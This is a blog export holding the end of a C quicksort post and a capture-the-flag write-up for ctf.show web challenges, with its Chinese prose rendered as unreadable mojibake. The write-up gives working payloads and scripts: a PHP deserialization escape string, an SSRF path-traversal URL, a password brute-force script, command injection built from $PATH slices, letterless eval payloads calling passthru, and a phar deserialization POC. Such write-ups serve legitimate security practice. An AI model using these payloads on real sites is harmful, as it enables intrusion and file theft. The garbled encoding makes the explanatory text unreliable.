j)\r{\rj--;//ä»å³å¾€å·¦æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°å°äºï¼Œæˆ–è€…è·‘åˆ°æœ€å·¦ç«¯ï¼Œå½“ç„¶è·‘åˆ°æœ€å·¦ç«¯çš„è¯é‚£ä¹ˆè¿™ä¸ªæ•°å­—å°±æ˜¯æœ€å¤§äº†ï¼Œç›´æ¥æ”¾åˆ°rightå»\r}\rwhile (a[i] \u0026lt;= temp \u0026amp;\u0026amp; i \u0026lt; j)\r{\ri++;\r}\rif (i \u0026lt; j)//æ²¡æœ‰ç›¸é‡çš„æƒ…å†µ,å°±äº¤æ¢\r{\rk = a[i];\ra[i] = a[j];\ra[j] = k;\r}\r}\r//æœ€åå½’ä½åŸºå‡†æ•°\ra[left] = a[i];\ra[i] = temp;\rquickSort(left, i - 1);\rquickSort(i + 1, right);//é€’å½’è°ƒç”¨ï¼Œåˆ†åˆ«å¤„ç†ä¸¤ç«¯åºåˆ—\rreturn;\r}\rint main()\r{\rint i, j, n;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;n);\rfor (int c = 1; c \u0026lt;= n; c++)\r{\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;a[c]);\r}\rquickSort(1, n);\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, a[i]);\r}\rreturn 0;\r} è‡³äºä¸ºä»€ä¹ˆéå¾—ä»å³è¾¹å¼€å§‹æ‰¾ï¼Œå¯ä»¥è¿™æ ·ç†è§£ğŸ‘‡\nç»™å‡ºä¸€ç»„åºåˆ—ï¼š\n6 1 2 7 9\nå…ˆä»å·¦è¾¹æ‰¾åˆ° 7\nå†ä»å³è¾¹å¼€å§‹ï¼Œåˆ° 7 çš„æ—¶å€™ä¸¤ä¸ªæŒ‡é’ˆå°±ç›¸é‡å’¯\næŒ‰ç…§ä¸Šé¢è¯´çš„ï¼Œç›¸é‡é‚£ä¹ˆå°±è¯¥å½’ä½\né‚£ä¹ˆå¾—åˆ°ï¼š\n7 1 2 6 9\nèƒ½å‘ç°ç»“æœä¸å¯¹å•Šï¼\né—®é¢˜å°±åœ¨äºï¼šå¦‚æœæˆ‘ä»¬å…ˆä»å·¦è¾¹å¼€å§‹æ‰¾ï¼Œé‚£ä¹ˆæ‰¾åˆ°çš„é‚£ä¸ªæ•°å­—ä¸€å®šæ˜¯å¤§äºåŸºå‡†æ•°çš„ï¼Œäº¤æ¢ä¹‹åå°±è¿èƒŒäº†å·¦å°å³å¤§çš„åŸåˆ™\næ‰€ä»¥ï¼šæˆ‘ä»¬å¿…é¡»ä»å³è¾¹å¼€å§‹ï¼Œä¹Ÿå°±æ˜¯ä»åŸºå‡†æ•°çš„å¯¹é¢å¼€å§‹ã€‚\nå¿«é€Ÿæ’åºè¿˜æ˜¯è¦ä¾é æ•°ç»„ï¼Œä¸è¿‡ç›¸è¾ƒäºå†’æ³¡ï¼Œæ¯æ¬¡çš„äº¤æ¢éƒ½æ˜¯è·³è·ƒå¼çš„\nä¸è¿‡å½“åºåˆ—å¤„äºå®Œå…¨é€†åºçš„æƒ…å†µä¸‹ï¼ˆæœ€åçš„æƒ…å†µï¼‰ï¼Œå¿«æ’çš„æ—¶é—´å¤æ‚åº¦å’Œå†’æ³¡æ˜¯ä¸€æ ·çš„\nç®€å•çš„å­¦ä¹ äº†ä¸€ä¸‹ä¸‰ä¸ªåŸºæœ¬çš„æ’åºæ–¹å¼\næ’åºæ–¹å¼ä¸æ­¢è¿™ä¸‰ç§ï¼š\nå†’æ³¡æ’åºï¼ˆBubble Sortï¼‰\næ’å…¥æ’åºï¼ˆInsertion Sortï¼‰\nå¸Œå°”æ’åºï¼ˆShell Sortï¼‰\né€‰æ‹©æ’åºï¼ˆSelection Sortï¼‰\nå¿«é€Ÿæ’åºï¼ˆQuick Sortï¼‰\nå½’å¹¶æ’åºï¼ˆMerge Sortï¼‰\nå †æ’åºï¼ˆHeap Sortï¼‰\nè®¡æ•°æ’åºï¼ˆCounting Sortï¼‰\næ¡¶æ’åºï¼ˆBucket Sortï¼‰\nåŸºæ•°æ’åºï¼ˆRadix Sortï¼‰\nåé¢å†å­¦ä¹ å…¶ä»–çš„ç½¢\n","date":"2023-07-09","externalUrl":null,"permalink":"/posts/2023/07/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%8E%92%E5%BA%8F/","section":"Posts","summary":"","title":"å‡ ä¸ªç®€å•çš„æ’åº","type":"posts"},{"content":"æ—¥å¸¸ç»ƒä¹ é¢˜ é¢˜ç›®æ¥æºï¼šctf.show\næœˆé¥¼æ¯ #\rWeb1_æ­¤æœˆåœ† #\ré¢˜ç›®é™„ä»¶ä¸­æœ‰çš„index.php\n\u0026lt;?php\rclass a\r{\rpublic $uname;\rpublic $password;\rpublic function __construct($uname,$password)\r{\r$this-\u0026gt;uname=$uname;\r$this-\u0026gt;password=$password;\r}\rpublic function __wakeup()\r{\rif($this-\u0026gt;password===\u0026#39;yu22x\u0026#39;)\r{\rinclude(\u0026#39;flag.php\u0026#39;);\recho $flag;\t}\relse\r{\recho \u0026#39;wrong password\u0026#39;;\r}\r}\r}\rfunction filter($string){\rreturn str_replace(\u0026#39;Firebasky\u0026#39;,\u0026#39;Firebaskyup\u0026#39;,$string);\r}\r$uname=$_GET[1];\r$password=1;\r$ser=filter(serialize(new a($uname,$password)));\r$test=unserialize($ser);\r?\u0026gt; è¿™é‡Œåªèƒ½GETä¼ å…¥ä¸€ä¸ªåä¸º1çš„å˜é‡ï¼Œpasswordæ˜¯å·²ç»è®¾ç½®å¥½ä¸º1çš„\nä½†æ˜¯åœ¨è¿™ä¸ªä»£ç é‡Œè¿˜å­˜åœ¨ä¸€ä¸ªfilterå‡½æ•°ï¼Œå°†Firebaskyæ›¿æ¢æˆäº†Firebaskyup\nè¿™æ˜¯å¯ä»¥è¿›è¡Œååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çš„æ”»å‡»ç‚¹\nåœ¨wakeupé­”æœ¯æ–¹æ³•é‡Œï¼Œå½“passswordæ˜¯yu22xçš„æ—¶å€™ä¾¿ä¼šè¾“å‡ºflag\né‚£ä¹ˆä¸‹é¢è¿›è¡Œæ„é€ å­—ç¬¦ä¸²\nç”±äºæœ‰filterçš„å­˜åœ¨ï¼Œæ¯ä¸€ä¸ªFirebaskyä¼šé€ƒé€¸å‡º2ä¸ªå­—ç¬¦\næˆ‘ä»¬æƒ³è¦æ„é€ çš„å­—ç¬¦ä¸²æ˜¯è¿™æ ·çš„\r\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:5:\u0026#34;yu22x\u0026#34;;}\ré•¿åº¦ä¸º30 é‚£ä¹ˆå°±éœ€è¦unameé‡Œé¢æœ‰15ä¸ªFirebaskyï¼Œæ¥é€ æˆ30ä¸ªé•¿åº¦çš„æº¢å‡º\nPOC:\r?1= FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:5:\u0026#34;yu22x\u0026#34;;} Web2_æ•…äººå¿ƒ #\rä»£ç å®¡è®¡é¢˜\n\u0026lt;?php\rerror_reporting(0);\rhighlight_file(__FILE__);\r$a=$_GET[\u0026#39;a\u0026#39;];\r$b=$_GET[\u0026#39;b\u0026#39;];\r$c=$_GET[\u0026#39;c\u0026#39;];\r$url[1]=$_POST[\u0026#39;url\u0026#39;];\rif(is_numeric($a) and strlen($a)\u0026lt;7 and $a!=0 and $a**2==0){\r$d = ($b==hash(\u0026#34;md2\u0026#34;, $b)) \u0026amp;\u0026amp; ($c==hash(\u0026#34;md2\u0026#34;,hash(\u0026#34;md2\u0026#34;, $c)));\rif($d){\rhighlight_file(\u0026#39;hint.php\u0026#39;);\rif(filter_var($url[1],FILTER_VALIDATE_URL)){\r$host=parse_url($url[1]);\rprint_r($host); if(preg_match(\u0026#39;/ctfshow\\.com$/\u0026#39;,$host[\u0026#39;host\u0026#39;])){\rprint_r(file_get_contents($url[1]));\r}else{\recho \u0026#39;å·®ç‚¹ç‚¹å°±æˆåŠŸäº†ï¼\u0026#39;;\r}\r}else{\recho \u0026#39;please give me url!!!\u0026#39;;\r} }else{\recho \u0026#39;æƒ³ä¸€æƒ³md5ç¢°æ’åŸç†å§?!\u0026#39;;\r}\r}else{\recho \u0026#39;ç¬¬ä¸€ä¸ªéƒ½è¿‡ä¸äº†è¿˜æƒ³è¦flagå‘€?!\u0026#39;;\r} ä¸€å±‚ä¸€å±‚çš„æ¥çœ‹å§\nç¬¬ä¸€å±‚ï¼š\naæ˜¯æ•°å­—ï¼Œé•¿åº¦å°äº7ï¼Œä¸ç­‰äº0ï¼Œä½†æ˜¯å¹³æ–¹åç­‰äº0\nå…¶å®åªè¦æ„é€ ä¸€ä¸ªæå°çš„æ•°å­—å°±å¯ä»¥äº†\nç”¨ç§‘å­¦è®¡æ•°æ³•ï¼š\na=1e-200 å°±æ˜¯1çš„è´Ÿ200æ¬¡æ–¹ 0.000000\u0026hellip;1ï¼Œå†å¹³æ–¹ä¸€ä¸‹è¿™ä¸ªæ•°å·²ç»å°åˆ°è®¡ç®—æœºéƒ½ä¸æƒ³è¦äº†ï¼Œæ‰€ä»¥è¯´å¹³æ–¹å°±ç­‰äº0å’¯ã€‚\nç¬¬äºŒå±‚ï¼š\nbè¦ç­‰äºbçš„md2å€¼ï¼Œç„¶åcè¦ç­‰äºcçš„md2å€¼çš„md2å€¼\nè¿™é‡Œæ¶‰åŠåˆ°å¼±æ¯”è¾ƒï¼Œè¦æ±‚ç­‰å·ä¸¤ç«¯éƒ½è¦æ˜¯0eå¼€å¤´\nç›´æ¥è·‘çš„è¯éƒ½ä¸çŸ¥é“è¦è·‘å¤šä¹…ï¼Œä¸è¿‡åœ¨robots.txté‡Œå‘ç°hint\nå¯ä»¥çœ‹åˆ°ç»™å‡ºäº†æœ«å°¾å‡ ä½æ•°\næ ¹æ®è¿™ä¸ªæ¥å†™ä¸€ä¸ªè„šæœ¬\n\u0026lt;?php\rfor ($i = 0; $i \u0026lt; 10000000; $i++) {\r$a=hash(\u0026#39;md2\u0026#39;,\u0026#39;0e\u0026#39;.$i.\u0026#39;024452\u0026#39;);\rif (is_numeric($a)\u0026amp;\u0026amp;substr($a,0,2)==\u0026#39;0e\u0026#39;)\r{\recho \u0026#39;1=0e\u0026#39;.$i.\u0026#39;024452\u0026#39;;\recho PHP_EOL;\r}\r$b=hash(\u0026#39;md2\u0026#39;,hash(\u0026#39;md2\u0026#39;,\u0026#39;0e\u0026#39;.$i.\u0026#39;48399\u0026#39;));\rif(is_numeric($b)\u0026amp;\u0026amp;substr($b,0,2)==\u0026#39;0e\u0026#39;)\r{\recho \u0026#39;2=0e\u0026#39;.$i.\u0026#39;48399\u0026#39;;\recho PHP_EOL;\r}\r} å¾—åˆ°ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼š\nb=0e652024452\rc=0e603448399 ç¬¬ä¸‰å±‚ï¼š\nè¦POSTä¸€ä¸ªurl\nhintè¯´äº†flagåœ¨/f10g.txté‡Œ\nè¿™é‡Œfilter_varå‡½æ•°å¯ä»¥è§£æå¾ˆå¤šåè®®\nè¿™é‡Œçš„è¯å°è¯•ç”¨SSRFï¼Œä½¿ç”¨ä¸å­˜åœ¨çš„åè®®\nphpé‡åˆ°ä¸è®¤è¯†çš„åè®®å°±ä¼šå½“ç›®å½•å¤„ç†\näºæ˜¯æ„é€ å¦‚ä¸‹payloadï¼Œé…åˆç›®å½•ç©¿è¶Šä¸€ä¸‹å¾—åˆ°flag\nurl=a://ctfshow.com/../../../../../../../fl0g.txt Web3_è«è´Ÿå©µå¨Ÿ #\råœ¨æºä»£ç é‡Œå‘ç°éƒ¨åˆ†ä»£ç \n\u0026lt;!-- username yu22x --\u0026gt;\r\u0026lt;!-- SELECT * FROM users where username like binary(\u0026#39;$username\u0026#39;) and password like binary(\u0026#39;$password\u0026#39;)--\u0026gt; çœ‹æ¥æ˜¯likeæ¨¡ç³ŠæŸ¥è¯¢ï¼Œ%æ˜¯sqlè¯­å¥ä¸­çš„é€šé…ç¬¦ï¼Œå¯ä»¥åŒ¹é…å¤šä¸ªå­—ç¬¦ï¼Œä¸‹åˆ’çº¿___å¯ä»¥åŒ¹é…ä¸€ä¸ªå­—ç¬¦\nè¿™é‡Œ%è¢«banäº†ï¼Œä¸è¿‡ä¸‹åˆ’çº¿å¯ä»¥ä½¿ç”¨\né¦–å…ˆæµ‹è¯•å¾—åˆ°å¯†ç æœ‰32ä½\nå½“å¯†ç å¤§äºæˆ–å°äº32ä½çš„æ—¶å€™ä¼šæŠ¥\nwrong username or password\nè€Œå¯†ç æ˜¯32ä½çš„æ—¶å€™æŠ¥çš„æ˜¯\nI have filtered all the characters. Why can you come in? get out!\nçŸ¥é“ä½æ•°å°±å¯ä»¥å†™è„šæœ¬çˆ†ç ´äº†\nè„šæœ¬å¦‚ä¸‹ï¼š\nimport requests\rimport string\rdict=string.digits+string.ascii_letters\rurl=\u0026#39;http://3bf67942-614c-402b-a661-0b62f443f665.challenge.ctf.show/login.php\u0026#39;\rpassword=\u0026#39;\u0026#39;\rfor i in range(32):\rfor j in dict:\rpasswd=password+j+(31-i)*\u0026#39;_\u0026#39;\rdata={\u0026#39;username\u0026#39;:\u0026#39;yu22x\u0026#39;,\u0026#34;password\u0026#34;:passwd}\rr=requests.post(url=url,data=data)\rif \u0026#39;wrong\u0026#39; not in r.text:\rpassword+=j\rprint(password)\rbreak; è·‘å‡ºæ¥å¯†ç æ˜¯ï¼š67815b0c009ee970fe4014abaa3Fa6A0\nç„¶åä¸‹ä¸€ä¸ªç•Œé¢æ˜¯\nä¸€äº›å¸¸è§çš„å‘½ä»¤æ‰§è¡Œç¬¦å·éƒ½è¢«è¿‡æ»¤æ‰äº†\nçœ‹äº†çœ‹ç½‘ä¸Šçš„wpï¼Œå°å†™å­—æ¯å…¨è¢«è¿‡æ»¤ã€‚å¤§å†™å­—æ¯ã€æ•°å­—ã€$ã€:æ²¡è¢«è¿‡æ»¤ã€‚\næœ‰ä¸ªæ–°æ€è·¯ï¼Œåˆ©ç”¨ç¯å¢ƒå˜é‡æ¥æ„é€ å­—ç¬¦ä¸²\nå¯ä»¥çœ‹åˆ°ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡æ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åˆ‡ç‰‡æ“ä½œæ¥å–å‡ºå…¶ä¸­çš„å­—æ¯ï¼Œåƒä¸‹é¢è¿™æ ·\n0;${PATH:5:1}${PATH:2:1} //ls çˆ†å‡ºç›®å½• çœ‹åˆ°flagåœ¨ç¬¬ä¸€ä¸ªæ–‡ä»¶\nå¯ä»¥åˆ©ç”¨nlå‘½ä»¤è¯»å–ç¬¬ä¸€ä¸ªæ–‡ä»¶\nè¿™é‡Œæ˜Ÿå·è¢«è¿‡æ»¤ï¼Œä½†æ˜¯é—®å·æ²¡è¢«è¿‡æ»¤\npocï¼š\r0;${PATH:14:1}${PATH:5:1} ????.???\r//0ï¼›nl flag.php åƒç“œæ¯ #\rshellme #\rè¿™é“é¢˜æœ‰é—®é¢˜ï¼Œphpinfoä¹‹é—´Ctrl+Få°±èƒ½æ‰¾åˆ°flag\nshellme_Revenge #\rè¿™é“é¢˜è¿›å»ä¹Ÿæ˜¯phpinfoï¼Œæ‰¾æ‰¾æœ‰æ•ˆä¿¡æ¯\nåœ¨phpå˜é‡é‡Œæ‰¾åˆ°hint\nå¾—åˆ°æºç å¦‚ä¸‹ï¼š\n\u0026lt;?php\rerror_reporting(0);\rif ($_GET[\u0026#39;looklook\u0026#39;]){\rhighlight_file(__FILE__);\r}else{\rsetcookie(\u0026#34;hint\u0026#34;, \u0026#34;?looklook\u0026#34;, time()+3600);\r}\rif (isset($_POST[\u0026#39;ctf_show\u0026#39;])) {\r$ctfshow = $_POST[\u0026#39;ctf_show\u0026#39;];\rif (is_string($ctfshow) || strlen($ctfshow) \u0026lt;= 107) {\rif (!preg_match(\u0026#34;/[!@#%^\u0026amp;*:\u0026#39;\\\u0026#34;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/\u0026#34;,$ctfshow)){\reval($ctfshow);\r}else{\recho(\u0026#34;fucccc hacker!!\u0026#34;);\r}\r}\r} else {\rphpinfo();\r}\r?\u0026gt; ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œè¿‡æ»¤äº†å¤§å°å†™å­—æ¯ï¼ˆCå¯ä»¥ç”¨ï¼‰ã€ä¸€äº›ç‰¹æ®Šç¬¦å·ä»¥åŠ4-9ä¹‹é—´çš„æ•°å­—\nä¸è¿‡è‡ªå¢æ„é€ å‘½ä»¤çš„å…³é”®è¦ç´ ï¼š $ _ [ ] ; + = æ²¡æœ‰è¿‡æ»¤æ‰\nè¿™é‡Œå°±å°è¯•ä½¿ç”¨è‡ªå¢æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\næˆ‘ä»¬çš„ç›®çš„æ˜¯è¦æ„é€ system(order)è¿™æ ·çš„å‘½ä»¤\nä½†æ˜¯åˆä¸èƒ½å‡ºç°å­—æ¯ï¼Œé‚£å°±åªèƒ½å¼•å…¥å¤–éƒ¨çš„å‚æ•°ï¼Œæ‰€ä»¥è¦æ„é€ ä¸º\n$_GET[1]($_GET[2]); phpä»£ç å¦‚ä¸‹ï¼š\n\u0026lt;?php\r$_=C;\r$_++;\r$_++;\r$__=$_;//E\r$_++;\r$_++;\r$___=$_;//G\r$_=(C/C.C)[0];//N è¿™å¥è¯çš„æ„æ€ï¼Œå­—æ¯/å­—æ¯=0/0å°±ä¼šè¢«è®¤ä¸ºæ˜¯æ— æ³•è¢«æµ‹é‡ä¹Ÿå°±æ˜¯NaNå¯ä»¥å–å¾—Nå­—æ¯\r$_++;//o $_++;//p\r$_++;//q\r$_++;//r\r$_++;//s\r$_=_.$___.$__.++$_;//_GET\r$$_[1]($$_[2]);//$_GET[1]($_GET[2]);\rpostçš„æ—¶å€™è¦urlç¼–ç ä¸€æ¬¡\rè¿™é‡Œæœ‰ä¸ªå‘ï¼Œåœ¨phpinfoé‡Œä¹Ÿå¯ä»¥å‘ç°ï¼Œsystemè¿™ä¸ªå‡½æ•°è¢«banäº†ï¼Œä¸è¿‡å¯ä»¥æ›¿ä»£ä»–çš„passthruæ²¡æœ‰è¢«ban\rå°±å¯ä»¥åˆ©ç”¨passthruæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ çƒ­èº« #\rç­¾åˆ°ä½“\nçœ‹çœ‹ä»£ç å®¡è®¡\ninclude(\u0026#34;flag.php\u0026#34;);\rhighlight_file(__FILE__);\rif(isset($_GET[\u0026#39;num\u0026#39;])){\r$num = $_GET[\u0026#39;num\u0026#39;];\rif($num==4476){\rdie(\u0026#34;no no no!\u0026#34;);\r}\rif(preg_match(\u0026#34;/[a-z]|\\./i\u0026#34;, $num)){\rdie(\u0026#34;no no no!!\u0026#34;);\r}\rif(!strpos($num, \u0026#34;0\u0026#34;)){\rdie(\u0026#34;no no no!!!\u0026#34;);\r}\rif(intval($num,0)===4476){\recho $flag;\r}\r} é¦–å…ˆä¸èƒ½ç­‰äº4476ï¼Œç„¶åä¸èƒ½æœ‰å­—æ¯å’Œå°æ•°ç‚¹ï¼Œstrposåœ¨numé‡Œæ‰¾0ï¼ˆè¿™é‡Œæ²¡ç»™å‚æ•°ï¼Œé»˜è®¤ä»0ä½å¼€å§‹æ‰¾ï¼‰\næœ€åintvalé‡Œçš„å‚æ•°0ï¼Œè¯´æ˜äº†æ ¹æ®å˜é‡ç±»å‹æ¥è½¬æ¢ï¼Œæ„æ€å°±æ˜¯å¯ä»¥ä¼ å…«è¿›åˆ¶æˆ–è€…16è¿›åˆ¶\né‚£ä¹ˆæ€è·¯å°±æœ‰äº†ï¼š\nnumæˆ‘ä»¬å¯ä»¥ç”¨å…«è¿›åˆ¶æ¥ç»•è¿‡ï¼Œå› ä¸ºå…«è¿›åˆ¶ä¸éœ€è¦å­—æ¯\nstrposå‡½æ•°çš„è¯åªéœ€è¦åœ¨numçš„[1]è¿™ä¸ªä¸‹æ ‡é‡Œæ˜¯0ï¼Œé‚£ä¹ˆstrposå°±è¿”å›1ï¼Œç„¶åifé‡Œå°±å˜æˆ0ï¼Œåˆ™ä¸æ‰§è¡Œ\nPOC:\r?num=+010574 ATTup #\ræœ‰ä¸¤ä¸ªç•Œé¢ï¼Œä¸€ä¸ªä¸Šä¼ ï¼Œä¸€ä¸ªæŸ¥è¯¢\nå…ˆçœ‹çœ‹æŸ¥è¯¢\nçœ‹åˆ°ä¸€ä¸ªfind.phpï¼Œå°è¯•ç”¨find.phpæ¥æŸ¥çœ‹ä»–è‡ªå·±\næŠ“ä¸ªåŒ…,å‘é€åˆ°repeater ,ç›´æ¥æ”¾åŒ…çš„è¯ä»–ä¼šä¸€ç›´å¼¹çª—,ä¸å¥½çœ‹\næˆ‘ä»¬åœ¨find.phpå‘ç°ä»¥ä¸‹PHPä»£ç \nclass View {\rpublic $fn;\rpublic function __invoke(){\r$text = base64_encode(file_get_contents($this-\u0026gt;fn));\recho \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;\u0026#34;.$text.\u0026#34;\u0026#39;);self.location=document.referrer;\u0026lt;/script\u0026gt;\u0026#34;;\r}\r}\rclass Fun{\rpublic $fun = \u0026#34;:)\u0026#34;;\rpublic function __toString(){\r$fuc = $this-\u0026gt;fun;\r$fuc();\rreturn \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Be a happy string~\u0026#39;);self.location=document.referrer;\u0026lt;/script\u0026gt;\u0026#34;;\r}\rpublic function __destruct()\r{\recho \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Just a fun \u0026#34;.$this-\u0026gt;fun.\u0026#34;\u0026#39;);self.location=document.referrer;\u0026lt;/script\u0026gt;\u0026#34;;\r}\r}\r$filename = $_POST[\u0026#34;file\u0026#34;];\r$stat = @stat($filename);--\u0026gt; æœ‰æ–‡ä»¶ä¸Šä¼ ,åˆæœ‰è¯»å–æ–‡ä»¶,é‚£ä¹ˆåº”è¯¥å°±æ˜¯pharååºåˆ—åŒ–äº†,\nå…ˆä¸Špoc:\n\u0026lt;?php\rclass Fun{\rpublic $fun ;\r}\rclass View {\rpublic $fn=\u0026#39;/flag\u0026#39;;\r}\r$d=new Fun();//å®ä¾‹åŒ–å¯¹è±¡\r$v = new View();//å®ä¾‹åŒ–å¯¹è±¡\r$d-\u0026gt;fun = $v;//ç¬¬ä¸€å±‚åµŒå¥—ï¼Œä¸ºäº†è§¦å‘invokeè€Œå‡†å¤‡çš„\r$new = new Fun();//å†å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡\r$new-\u0026gt;fun = $d;//ä¸ºè§¦å‘tostringè€Œå‡†å¤‡çš„\r$phar = new Phar(\u0026#34;test.phar\u0026#34;); //æ–‡ä»¶åï¼Œåç¼€åå¿…é¡»ä¸ºphar\r$phar-\u0026gt;startBuffering();\r$phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39; __HALT_COMPILER();\u0026#39;); //è®¾ç½®stub\r$phar-\u0026gt;setMetadata($new); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest\r$phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶\r$phar-\u0026gt;stopBuffering(); //ç­¾åè‡ªåŠ¨è®¡ç®— è§£é‡Šä¸€ä¸‹,è¿™é‡Œå®ä¾‹äº†ä¸‰ä¸ªå¯¹è±¡,åˆ†åˆ«æ˜¯d v å’Œnew\nå½¢æˆäº†è¿™æ ·çš„é“¾æ¡:\nnew-\u0026gt;funæŒ‡å‘d d-\u0026gt;funæŒ‡å‘v\nå› ä¸ºåœ¨ç”Ÿæˆçš„pharæ–‡ä»¶ä¸­è‡ªå®šä¹‰çš„dataæ˜¯new\nåœ¨@statè¯»å–æ–‡ä»¶çš„æ—¶å€™å°±å…ˆä»newè¿™é‡Œè¯»\næˆ‘ç”»äº†ä¸€å¼ å›¾:\nè§¦å‘é“¾å°±æ˜¯è¿™æ ·çš„,ç”¨ä¸Šé¢çš„phpä»£ç ç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶ä¸Šä¼ \nç„¶åå†ç”¨pharåè®®è¯»å–æ–‡ä»¶å°±èƒ½å¾—åˆ°flag,è®°å¾—è¦æ”¹ä¸ºzipæˆ–è€…raræ–‡ä»¶åç¼€\né­”å¥³(æœªå®Œæˆ #\rè¿™é“é¢˜æ²¡åšå‡ºæ¥,ç½‘ä¸Šä¹Ÿæ²¡æœ‰wp,å°±åªèƒ½å†™å†™è¿‡ç¨‹\nè¿›å»æ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢\nåœ¨æºä»£ç ä¸­å‘ç°\nç•Œé¢ä¸­æ˜¯æ²¡æœ‰registerçš„,è¿™é‡Œæˆ‘ä»¬æŠ“åŒ…ä¿®æ”¹ä¸€ä¸‹dologin,å®ç°æ³¨å†Œä¸€ä¸ªè´¦æˆ·\nè¿›å…¥ä¹‹åæœ‰å‡ ä¸ªç•Œé¢, åˆ†åˆ«æ˜¯ä¸»é¡µ, ä¿®æ”¹ä¿¡æ¯, ä¸ªäººèµ„æ–™, ä»¥åŠé€€å‡ºç™»å½•\nä¸»é¡µé‡Œæ²¡ä»€ä¹ˆä¸œè¥¿,å°±ä¸€åªçŒ«åœ¨é‚£é‡Œæ™ƒ\nç„¶åä¸ªäººèµ„æ–™é‡Œæœ‰ä¸€ä¸ªä¸‹è½½å›¾ç‰‡çš„é“¾æ¥\næˆ‘ä»¬æŠ“ä¸€ä¸‹åŒ…,å‘ç°æ–‡ä»¶åå­—æ˜¯å¯æ§çš„\nè¿™é‡Œæˆ‘ä»¬å°è¯•ä¸‹index.php\nåŒ…å«äº†ä¸€ä¸ªbase.php, é‚£å†æŠŠå®ƒä¸‹è½½ä¸€ä¸‹\nbase.php çš„ä»£ç å¦‚ä¸‹\n\u0026lt;?php\rdefine(\u0026#39;CTF\u0026#39;, \u0026#39;SHOW\u0026#39;);\rdefine(\u0026#39;DEBUG\u0026#39;,true);\rdefine(\u0026#39;WEB_ROOT\u0026#39;,__DIR__.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;WEB_APP_ROOT\u0026#39;,WEB_ROOT.\u0026#39;application\u0026#39;.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;FRAMEWORK_ROOT\u0026#39;,WEB_ROOT.\u0026#39;framework\u0026#39;.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;DEFAULT_METHOD\u0026#39;,\u0026#39;main\u0026#39;);\rdefine(\u0026#39;DEFAULT_ACTION\u0026#39;,\u0026#39;index\u0026#39;);\rdefine(\u0026#39;DEFAULT_TABLE_PRE\u0026#39;,\u0026#39;ctfshow_\u0026#39;);\rdefine(\u0026#39;DEFAULT_EXT\u0026#39;,\u0026#39;.php\u0026#39;);\rdefine(\u0026#39;DEFAULT_ACTION_DIR\u0026#39;,\u0026#39;action\u0026#39;);\rdefine(\u0026#39;DEFAULT_MODEL_DIR\u0026#39;,\u0026#39;model\u0026#39;);\rdefine(\u0026#39;DEFAULT_TEMPLATES_DIR\u0026#39;,\u0026#39;templates\u0026#39;);\rdefine(\u0026#39;DEFAULT_COOKIE\u0026#39;,\u0026#39;ctfshow\u0026#39;);\rdefine(\u0026#39;TEMPLATE_PATH\u0026#39;,WEB_APP_ROOT.DEFAULT_TEMPLATES_DIR.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;ACTION_PATH\u0026#39;,WEB_APP_ROOT.DEFAULT_ACTION_DIR.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;CLASS_PATH\u0026#39;,FRAMEWORK_ROOT.\u0026#39;class\u0026#39;.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;INCLUDE_PATH\u0026#39;,WEB_APP_ROOT.\u0026#39;include\u0026#39;.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;MODEL_PATH\u0026#39;,WEB_APP_ROOT.\u0026#39;model\u0026#39;.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;STATIC_PATH\u0026#39;,WEB_ROOT.\u0026#39;www\u0026#39;.DIRECTORY_SEPARATOR.\u0026#39;static\u0026#39;.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;AVATAR_PATH\u0026#39;,STATIC_PATH.\u0026#39;img\u0026#39;.DIRECTORY_SEPARATOR.\u0026#39;avatar\u0026#39;.DIRECTORY_SEPARATOR);\rsession_start();\rrequire_once FRAMEWORK_ROOT.\u0026#39;ctfshow.php\u0026#39;;\rspl_autoload_register(function($class){\rif(file_exists(CLASS_PATH.strtolower($class).DEFAULT_EXT)){\rreturn include CLASS_PATH.strtolower($class).DEFAULT_EXT;\r}\rif(file_exists(MODEL_PATH.strtolower($class).DEFAULT_EXT)){\rreturn include MODEL_PATH.strtolower($class).DEFAULT_EXT;\r}\rif(file_exists(ACTION_PATH.strtolower($class).DEFAULT_EXT)){\rreturn include ACTION_PATH.strtolower($class).DEFAULT_EXT;\r}\r});\rctfshow::run();\r\u0026lt;script language=JavaScript\u0026gt; location.replace(location.href);\u0026lt;/script\u0026gt; 